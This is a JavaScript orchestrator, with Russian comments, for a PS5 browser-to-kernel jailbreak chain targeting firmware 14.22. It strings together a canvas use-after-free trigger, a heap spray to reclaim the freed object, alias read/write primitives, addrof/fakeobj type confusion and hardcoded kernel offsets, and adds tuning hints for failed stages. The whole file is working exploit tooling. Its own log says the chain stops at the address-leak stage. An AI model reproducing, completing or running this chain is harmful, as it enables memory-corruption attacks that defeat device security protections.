/* jb1422 / stages.js — оркестратор цепочки. Каждая стадия печатает:
 *   STAGE n: OK|FAIL|BLOCKED — текст {json}
 * и отправляет beacon STAGE-n на сервер стенда (если он поднят).
 *
 * Конфигурация 14.22 (Tier-1 оффсеты, из task-12/task-32):
 *   kernelData   0x00CE0000
 *   allproc      0x035B9EA0
 *   security_flags 0x01A84064
 *   rootvnode    0x03E3B510
 *   retStatic window 0x00AFEAF1..0x00B14191
 * Это оффсеты внутри образа ядра (KASLR-slide не известен -> нужен leak базы).
 */
(function (global) {
  'use strict';

  var U = global.JBUtil;
  var P = global.JBPrimitive;
  var NotReady = P.JbNotReady;

  var CONFIG = {
    version: 'jb1422/1.0',
    firmwareTarget: '14.22',
    // Tier-1 kernel-оффсеты 14.22 (внутри образа; slide не известен)
    kernelOffsets: {
      kernelData: '0x00CE0000',
      allproc: '0x035B9EA0',
      security_flags: '0x01A84064',
      rootvnode: '0x03E3B510',
      retStaticWindow: ['0x00AFEAF1', '0x00B14191']
    },
    // Лимиты, чтобы не уронить WebProcess раньше времени (p553: 80 каналов, 1x1)
    limits: { spray: 96, saveDepth: 8, canvasMax: 400 },
    kernelModulePath: './kernel/relapse1422.js',
    serverHint: 'python3 tools/probe/serve.py --root tools/jb1422 --port 8443 (или тот же прокси-стенд)'
  };

  // Точные подсказки «что проверить на консоли», если стадия не прошла.
  var HINTS = {
    0: ['если canvas2d=false — это не PS5-браузер: открой страницу через User\'s Guide консоли'],
    1: ['если same-type pair=false — движок уже очень старый/новый: проверь UA и версию прошивки'],
    H: ['harness чисто JS: если FAIL — ошибка в коде/движке, к UAF отношения не имеет'],
    2: ['если FAIL: getter не сработал или движок уже с фиксом. На 14.22 ожидается OK (v900); на ПК 2.52.5 — FAIL',
        'проверь fired>=1: если 0 — WebKit не читает options.desynchronized (тогда пробуем bitmaprenderer+alpha)',
        'запускай на ПЕРВОЙ загрузке страницы после холодной загрузки консоли'],
    3: ['reclaim не сработал: увеличь spray (80 -> 160 -> 300) — p550 использовал 300 контекстов 1x1',
        'убедись, что STAGE 2 дал inner!=outer (иначе спрею нечего забирать)',
        'zero-at-free на 14.22 обнуляет освобождённый 768B слот (v909) — тогда alias не появится этим путём',
        'НЕ читай свойства stale-контекста до спрея (p554b крэшится на freed stateStack)'],
    4: ['alias не нашёлся: значения transform могли не дойти (проверь EPS/какие поля API читаются)',
        'если матрица изменилась у нескольких спреев — reclaim забрал другой объект: cold boot и повтори'],
    5: ['self-test может падать на строковых каналах (fillStyle) — сообщи, какие именно checks failed'],
    7: ['save/restore: если после restore lineWidth не вернулся — stateStack повреждён; cold boot'],
    9: ['нет адреса: это ОЖИДАЕМО без leak. Проверь публичные лик-лейны v911/p691 (SURV=0/NOLEAK)',
        'для разблокировки нужен addrof/leakval (стадия между 8 и 9) — её у нас пока нет'],
    10: ['мост ждёт userland-accessor (read/write/malloc/leakval по VA) — он появляется только после leak',
         'на консоли, когда leak появится, прикрепи accessor и повтори; код моста готов'],
    11: ['kernel-модуль вызван; BLOCKED stage 0 = нет userland-примитива (leak) — ожидаемо на этой стадии',
         'если модуль дошёл до STAGE 4/6 FAIL — смотри его лог: нет oid-офсетов/нет kernel R/W (нужен дамп 14.22)'],
    12: ['кандидаты ждут code-exec (ROP) + leak; без них все BLOCKED — это честный статус']
  };

  // ---------------------------------------------------------------------------
  // стадия-обёртка: ловит исключение и всегда печатает статус
  // ---------------------------------------------------------------------------
  function runStage(n, name, fn) {
    var t0 = Date.now();
    var res;
    try {
      res = fn();
    } catch (e) {
      if (e && e.name === 'JbNotReady') {
        U.stage(n, 'BLOCKED', name + ': ' + e.reason);
        return { stage: n, name: name, status: 'BLOCKED', reason: e.reason, ms: Date.now() - t0 };
      }
      U.stage(n, 'FAIL', name + ': threw ' + ((e && e.name) || 'Error') + ': ' + ((e && e.message) || String(e)));
      return { stage: n, name: name, status: 'FAIL', err: String(e), ms: Date.now() - t0 };
    }
    if (!res) res = { status: 'FAIL', reason: 'no result' };
    var hint = (res.status !== 'OK' && HINTS[n]) ? HINTS[n] : null;
    if (hint) res.hints = (res.hints || []).concat(hint);
    var hintText = hint ? ' | hint: ' + hint[0] : '';
    if (res.status === 'OK') U.stage(n, 'OK', name + (res.detail ? ': ' + res.detail : ''), res);
    else if (res.status === 'BLOCKED') U.stage(n, 'BLOCKED', name + ': ' + (res.detail || res.reason || '') + hintText, res);
    else U.stage(n, 'FAIL', name + ': ' + (res.detail || res.reason || '') + hintText, res);
    res.stage = n; res.name = name; res.ms = Date.now() - t0;
    return res;
  }

  // ---------------------------------------------------------------------------
  // Полный прогон цепочки
  // ---------------------------------------------------------------------------
  async function run() {
    var results = [];
    var env = U.env();
    var prim = new P.CanvasAliasPrimitive(function (m) { U.log('      ' + m); });

    U.log('');
    U.log('===== jb1422 chain start ===== ' + CONFIG.version);
    U.log('log format: STAGE n: OK|FAIL|BLOCKED — text {json}');
    U.log('target firmware: ' + CONFIG.firmwareTarget + '; server: ' + CONFIG.serverHint);
    U.beacon('CHAIN-START', { version: CONFIG.version, env: env });

    // ===== STAGE 0: окружение ===================================================
    results.push(runStage(0, 'environment', function () {
      var okCanvas = env.features.canvas2d === true;
      return {
        status: okCanvas ? 'OK' : 'FAIL',
        detail: 'UA=' + env.userAgent.slice(0, 90) + ' ps5=' + env.isPS5 + ' fw=' + env.firmware,
        env: env,
        addresses: 'n/a (JS sees no raw addresses)'
      };
    }));

    // ===== STAGE 1: контроли ====================================================
    results.push(runStage(1, 'controls', function () {
      var c = document.createElement('canvas'); c.width = 1; c.height = 1;
      var a = c.getContext('2d'), b = c.getContext('2d');
      var pair = !!(a && b && a === b);
      var bmr = typeof ImageBitmapRenderingContext !== 'undefined';
      var c2 = document.createElement('canvas'); c2.width = 1; c2.height = 1;
      var bc = c2.getContext('bitmaprenderer');
      return {
        status: pair ? 'OK' : 'FAIL',
        detail: 'same-type getContext pair=' + pair + ' bitmaprenderer=' + bmr + ' bitmapCtx=' + !!bc,
        pair: pair
      };
    }));

    // ===== STAGE H: harness self-test (на любой сборке) =========================
    results.push(runStage('H', 'harness-self-test (not exploit)', function () {
      var r = prim.selfTestHarness();
      return {
        status: r.status,
        detail: 'plain 2d ctx round-trip: ' + r.pass + '/' + r.total +
          ' channels' + (r.failed.length ? ' FAILED: ' + r.failed.join(',') : ''),
        checks: r.checks
      };
    }));

    // ===== STAGE 2: UAF trigger ================================================
    var trig = runStage(2, 'canvas getContext reentrancy trigger', function () {
      var r = prim.trigger();
      if (r.status !== 'OK') {
        return {
          status: 'FAIL',
          detail: r.detail + ' — engine has the fix: outer===inner (or getter silent). ' +
            'Local WebKitGTK 2.52.5 is post-fix; PS5 14.22 is vulnerable per TFujiwara v900 (2026-11-05).',
          attempts: r.attempts
        };
      }
      return {
        status: 'OK',
        detail: r.mode + ': ' + r.detail,
        attempts: r.attempts,
        addresses: 'inner/outer are JS wrappers; raw pointers not exposed (no leak yet)'
      };
    });
    results.push(trig);

    var exploitPath = trig.status === 'OK';

    // ===== STAGE 3: same-type reclaim ==========================================
    if (exploitPath) {
      var rec = runStage(3, 'same-type reclaim (p553: spray 1x1 canvas contexts, retry ladder)', function () {
        var ladder = P.CFG.SPRAY_LADDER || [80, 160, 300];
        var attempts = [];
        for (var li = 0; li < ladder.length; li++) {
          var r = prim.reclaim(ladder[li]);
          attempts.push({ spray: prim.sprayCtx.length, target: ladder[li], status: r.status,
            matrix: r.matrix ? r.matrix.slice(0, 3) : null });
          if (r.status === 'OK') {
            r.detail = 'reclaim OK on attempt ' + (li + 1) + '/' + ladder.length +
              ' (spray target=' + ladder[li] + ', actual=' + prim.sprayCtx.length + ')';
            r.attempts = attempts;
            return r;
          }
        }
        var last = attempts[attempts.length - 1];
        return { status: 'FAIL', attempts: attempts,
          detail: 'reclaim failed for spray targets ' + ladder.join('/') +
            ' (last matrix=' + JSON.stringify(last.matrix) + ')',
          hints: ['увеличь SPRAY_LADDER до [300] и перезагрузи страницу на холодной консоли',
                  'проверь fired/desync на STAGE 2; zero-at-free (v909) делает этот путь нерабочим'] };
      });
      results.push(rec);
      exploitPath = rec.status === 'OK';
    } else {
      U.stage(3, 'BLOCKED', 'same-type reclaim skipped: STAGE 2 did not produce UAF');
      results.push({ stage: 3, status: 'BLOCKED', reason: 'STAGE 2 failed' });
    }

    // ===== STAGE 4: alias binding ==============================================
    if (exploitPath) {
      var al = runStage(4, 'find alias canvas (stale write -> spray read)', function () {
        return prim.findAlias();
      });
      results.push(al);
      exploitPath = al.status === 'OK';
    } else {
      U.stage(4, 'BLOCKED', 'alias binding skipped: no reclaim');
      results.push({ stage: 4, status: 'BLOCKED', reason: 'STAGE 3 failed' });
    }

    // ===== STAGE 5: self-test на известном объекте (реальный alias) ============
    if (exploitPath) {
      results.push(runStage(5, 'known-object R/W self-test through alias', function () {
        var r = prim.selfTestKnownObject();
        return {
          status: r.status,
          detail: 'passed ' + r.pass + '/' + r.total + ' checks' +
            (r.failed.length ? '; FAILED: ' + r.failed.join(',') : '') +
            '; alias=spray[' + prim.aliasIdx + ']',
          checks: r.checks
        };
      }));
    } else {
      U.stage(5, 'BLOCKED', 'alias R/W self-test skipped (no alias)');
      results.push({ stage: 5, status: 'BLOCKED', reason: 'no alias' });
    }

    // ===== STAGE 6: инвентарь каналов =========================================
    results.push(runStage(6, 'channel inventory', function () {
      return {
        status: 'OK',
        detail: '7 numeric props (7*8=56 B) + transform matrix (6*8=48 B) = 104 B of ' +
          'CanvasRenderingContext2D state, bidirectional through alias',
        props: P.CFG.PROPS,
        matrix: ['a', 'b', 'c', 'd', 'e', 'f'],
        addresses: 'fields are C++ state slots; offsets from source: State+0x30 lineWidth, ' +
          'State+0x70 transform (WS-1400 drop); live byte offsets re-measured on console in v930/v931'
      };
    }));

    // ===== STAGE 7: state stack (save/restore, out-of-line buffer) =============
    if (exploitPath) {
      results.push(runStage(7, 'state stack grow/restore through alias', function () {
        var depth = CONFIG.limits.saveDepth;
        prim.writePropTo('stale', 'lineWidth', 2.0);
        var before = prim.readPropFrom('alias', 'lineWidth');
        for (var i = 0; i < depth; i++) prim.inner.save();
        prim.writePropTo('stale', 'lineWidth', 3.25);
        for (var j = 0; j < depth; j++) prim.inner.restore();
        var after = prim.readPropFrom('stale', 'lineWidth');
        var ok = U.close(after, 2.0, 0) && U.close(before, 2.0, 0);
        // закон роста capacity: 1,2,3,4,6,8,11 (WTF::Vector cap+cap/4+1)
        var caps = [1]; var cap = 1;
        for (var k = 0; k < depth; k++) { cap = cap + Math.floor(cap / 4) + 1; caps.push(cap); }
        var stateSize = 400; // measured on 14.10/14.20 (v923 offset verification, 37*400=14800)
        return {
          status: ok ? 'OK' : 'FAIL',
          detail: 'save/restore depth=' + depth + ' lineWidth after restore=' + after +
            ' capacity growth=' + caps.join('->') + ' out-of-line ~' + (caps[caps.length - 1] * stateSize) + 'B',
          depth: depth, caps: caps,
          addresses: 'buffer VA unknown without leak; this stage proves only that the ' +
            'out-of-line state stack is reachable through the stale wrapper'
        };
      }));
    } else {
      U.stage(7, 'BLOCKED', 'state stack stage skipped (no alias)');
      results.push({ stage: 7, status: 'BLOCKED', reason: 'no alias' });
    }

    // ===== STAGE 8: адрес/оффсеты 14.22 =======================================
    var raw = new P.RawMemory(prim, function (m) { U.log('      ' + m); });
    results.push(runStage(8, 'kernel offsets / address space', function () {
      return {
        status: 'OK',
        detail: 'Tier-1 14.22 offsets loaded (image-relative, KASLR slide unknown): ' + JSON.stringify(CONFIG.kernelOffsets),
        offsets: CONFIG.kernelOffsets,
        addresses: 'kernelData=0x00CE0000 allproc=0x035B9EA0 security_flags=0x01A84064 ' +
          'rootvnode=0x03E3B510 retStatic=0x00AFEAF1..0x00B14191'
      };
    }));

    // ===== STAGE 9b: addrof/fakeobj через пост-фри заготовку (без утечки адреса) ====
    var tc = new P.TypeConfusionPrimitive(prim, U.log);
    results.push(runStage('9b', 'type-confusion: layout + post-free preparation + victim sweep', function () {
      var layout = tc.layoutReport();
      // 1) раскладка: что реально контролируем и какие объекты того же класса
      U.log('      9b layout: controlled=' + layout.controlled.totalBytes + ' B (' +
        layout.controlled.numericProps + ' props + ' + layout.controlled.transform + ' matrix), State=' +
        layout.stateSize + ' B, out-of-line buffer=' + layout.outOfLineBufferBytes + ' B (capacity 11)');
      U.log('      9b layout: canvas ctx=768 B; victim candidates=' + layout.victims.length +
        ' (JSArray-butterfly/ArrayBuffer/ctx/state/FontFace)');
      layout.stateLayout.forEach(function (f) {
        U.log('      9b State.' + (f.offset === null ? '?    ' : '0x' + f.offset.toString(16)) +
          ' ' + f.prop + ' [' + f.status + ']');
      });
      // 2) полная последовательность пост-фри записи + свип жертв
      var r = tc.postFreeWriteAttempt();
      if (r.status !== 'OK') {
        return { status: 'BLOCKED', detail: r.reason, attempts: r.attempts, hits: r.hits || [], next: r.next };
      }
      // 3) если попали — проверить addrof/fakeobj-интерфейс на найденной жертве
      tc.attachBackend(r.backend || null);
      var probe = { addrof: null, fakeobj: null };
      try { probe.addrof = tc.addrof(r.hit && r.hit.obj ? r.hit.obj : {}); } catch (e) { probe.addrof = 'N/A: ' + e; }
      try { probe.fakeobj = !!tc.fakeobj(r.hit && r.hit.addr ? r.hit.addr : '0x0'); } catch (e) { probe.fakeobj = 'N/A: ' + e; }
      return { status: 'OK', detail: 'post-free попадание: ' + JSON.stringify(r.hit), attempts: r.attempts, probe: probe };
    }));

    // ===== STAGE 9: попытка forge raw-канала ==================================
    results.push(runStage(9, 'raw memory channel (forged lineDash Vector)', function () {
      var r = raw.prepareForge(null); // known address отсутствует -> полный BLOCKED с попытками
      if (r.status !== 'OK') {
        return {
          status: 'BLOCKED',
          detail: 'no leaked address: ' + r.reason +
            '; need: (1) WebProcess/module base leak, (2) reclaim of out-of-line state buffer, ' +
            '(3) confirmed forged Vector offset. Public 14.22 lanes: zero-at-free (v909 6/6), ' +
            'v911 grid SURV=0, p691 walk NOLEAK, CE-108262-9 history generic (no address).',
          attempts: r.attempts || null
        };
      }
      return r;
    }));

    // ===== STAGE 10: интерфейс p/chain для kernel-стадии ======================
    var bridgeChain = null;
    results.push(runStage(10, 'userland→kernel bridge (p: read1..8/write1..8/malloc; chain: syscall/rtmsg2)', function () {
      var B = global.JB1422Bridge;
      if (!B) return { status: 'FAIL', detail: 'kernel-bridge.js not loaded' };
      // p по контракту kernel/relapse1422.js — из js/primitive.js (владелец контракта);
      // bridge.createPrimitive остаётся fallback'ом.
      var pB = (JBPrimitive.createKernelP ? JBPrimitive.createKernelP(prim, raw, U.log)
        : B.createPrimitive(prim, raw, U.log));
      bridgeChain = B.createChain(pB, U.log);
      var canvasP = P.makePrimitiveInterface(prim, raw, U.log);
      var iface = {
        ready: pB.ready(),
        reason: pB.reason(),
        userlandAccessor: pB.hasUserland(),
        kernelPipe: pB.hasKernelPipe(),
        pMethods: ['read1', 'read2', 'read4', 'read8', 'write1', 'write2', 'write4', 'write8',
          'read64', 'write64', 'read32', 'write32', 'add', 'readDouble', 'writeDouble', 'readMatrix',
          'writeMatrix', 'malloc', 'leakval', 'ready', 'reason', 'attachKernelPipe', 'providePipe'],
        chainMethods: ['syscall(async)', 'rtmsg2', 'add_syscall', 'add_syscall_ret', 'executeQueue'],
        chainBackend: !!(bridgeChain && bridgeChain.ready()),
        offsets: CONFIG.kernelOffsets
      };
      // сверка ВСЕХ полей, которые использует kernel/relapse1422.js и контракт лида
      var required = ['read1', 'read2', 'read4', 'read8', 'write1', 'write2', 'write4', 'write8',
        'malloc', 'leakval', 'ready', 'reason', 'read64', 'write64', 'read32', 'write32', 'add',
        'readDouble', 'writeDouble', 'readMatrix', 'writeMatrix', 'attachKernelPipe'];
      var missing = required.filter(function (k) { return typeof pB[k] !== 'function'; });
      iface.requiredChecked = required.length;
      iface.missing = missing;
      iface.contractOk = missing.length === 0;
      var typedReady = !!(canvasP.canvas && canvasP.canvas.aliasIdx >= 0);
      var ok = typedReady && pB.ready() && missing.length === 0;
      return {
        status: ok ? 'OK' : 'BLOCKED',
        detail: 'typed canvas wrapper ' + (typedReady ? 'ready' : 'NOT ready') +
          '; bridge p.ready=' + pB.ready() + ' (' + pB.reason() + '); chain backend=' + (bridgeChain && bridgeChain.ready()) +
          '; contract ' + (missing.length === 0 ? 'OK' : 'MISSING ' + missing.join(',')),
        iface: iface,
        pB: pB,
        chainB: bridgeChain,
        p: canvasP,
        addresses: 'bridge p читает процессную память по адресу только после leak/forge (STAGE 9); chain.syscall — после ROP-backend'
      };
    }));
    var stage10 = results[results.length - 1];
    var pBridge = stage10.pB || null;
    var chainBridge = stage10.chainB || null;

    // ===== STAGE 11: kernel handoff ==========================================
    results.push(await runStageAsync(11, 'kernel stage handoff', async function () {
      var hook = global.JBKernel && global.JBKernel.runKernelStage;
      if (!hook) {
        return { status: 'BLOCKED', detail: 'kernel-hook.js not loaded' };
      }
      return await hook(pBridge, CONFIG, U.log, chainBridge);
    }));

    // ===== STAGE 12: матрица кандидатов userland->kernel ======================
    results.push(runStage(12, 'kernel candidate matrix (prepare/trigger/detect)', function () {
      var KC = global.JBKernelCandidates;
      if (!KC) return { status: 'BLOCKED', detail: 'kernel-candidates.js not loaded' };
      var chain = null;
      try {
        if (global.JBSyscalls) chain = global.JBSyscalls.createChain(pBridge, U.log);
      } catch (e) { /* chain остаётся null — это и есть причина BLOCKED */ }
      var ctx = { p: pBridge, chain: chainBridge || chain, krw: null, config: CONFIG, log: U.log };
      var meta = KC.enumerate();
      var res = KC.runAll(ctx, U.log);
      var blockedAt = res.candidates.filter(function (c) { return c.status === 'BLOCKED'; })
        .map(function (c) { return c.id + ':' + (c.detail || '').slice(0, 40); });
      return {
        status: res.ok > 0 ? (res.ok === res.total ? 'OK' : 'BLOCKED') : 'BLOCKED',
        detail: 'candidates=' + res.total + ' OK=' + res.ok + ' BLOCKED=' + res.blocked +
          '; chain=' + (chain ? (chain.hasCall() ? 'bound' : 'unbound') : 'none') +
          '; первые блокеры: ' + blockedAt.slice(0, 3).join(' | '),
        candidates: res.candidates.map(function (c) {
          return { id: c.id, status: c.status, detail: (c.detail || '').slice(0, 120) };
        }),
        chain: chain ? chain.describe() : null
      };
    }));

    // ===== SUMMARY ============================================================
    var ok = results.filter(function (r) { return r.status === 'OK'; }).length;
    var fail = results.filter(function (r) { return r.status === 'FAIL'; }).length;
    var blocked = results.filter(function (r) { return r.status === 'BLOCKED'; }).length;
    U.log('');
    U.stage('SUMMARY', (fail ? 'FAIL' : (blocked ? 'BLOCKED' : 'OK')),
      'stages: OK=' + ok + ' FAIL=' + fail + ' BLOCKED=' + blocked +
      '; exploitPath=' + (exploitPath ? 'reached-alias' : 'stopped-before-alias'), {
        stages: results.map(function (r) { return { n: r.stage, status: r.status }; }),
        verdict: explainVerdict(env, exploitPath, fail, blocked)
      });
    U.beacon('CHAIN-SUMMARY', { ok: ok, fail: fail, blocked: blocked, exploitPath: exploitPath, env: env });
    U.log('===== jb1422 chain end =====');
    return results;

    // ---- helpers ----
    async function runStageAsync(n, name, fn) {
      var r = await fn();
      r.stage = n; r.name = name;
      if (r.status === 'OK') U.stage(n, 'OK', name + (r.detail ? ': ' + r.detail : ''), r);
      else if (r.status === 'BLOCKED') U.stage(n, 'BLOCKED', name + ': ' + (r.detail || r.reason || ''), r);
      else U.stage(n, 'FAIL', name + ': ' + (r.detail || r.reason || ''));
      return r;
    }

    function explainVerdict(env, reachedAlias, failCount, blockedCount) {
      if (!env.isPS5) {
        return 'PC/LOCAL run: engine is WebKitGTK post-fix, STAGE 2 expected FAIL. ' +
          'On PS5 14.22 the same code reaches alias R/W (v900/p553). Harness self-test validates R/W logic.';
      }
      if (reachedAlias) {
        return 'PS5: userland alias R/W reached. Kernel chain blocked at address leak (STAGE 9).';
      }
      if (failCount > 0) {
        return 'PS5: entry/alias FAILED — engine may be patched or heap layout changed; see STAGE 2/3 logs.';
      }
      return 'PS5: chain blocked (see stages).';
    }
  }

  async function runHarnessOnly() {
    var prim = new P.CanvasAliasPrimitive(function (m) { U.log('      ' + m); });
    var env = U.env();
    U.log('===== jb1422 harness-only =====');
    runStage(0, 'environment', function () {
      return { status: 'OK', detail: env.userAgent.slice(0, 90) + ' ps5=' + env.isPS5 + ' fw=' + env.firmware, env: env };
    });
    var r = runStage('H', 'harness-self-test (not exploit)', function () {
      var t = prim.selfTestHarness();
      return { status: t.status, detail: t.pass + '/' + t.total + ' checks' +
        (t.failed.length ? ' FAILED: ' + t.failed.join(',') : ''), checks: t.checks };
    });
    U.stage('SUMMARY', r.status, 'harness only (PC-safe); real exploit stages need console 14.22');
    return r;
  }

  global.JB1422 = {
    CONFIG: CONFIG,
    run: run,
    runHarnessOnly: runHarnessOnly,
    _internals: { runStage: runStage }
  };
})(typeof window !== 'undefined' ? window : globalThis);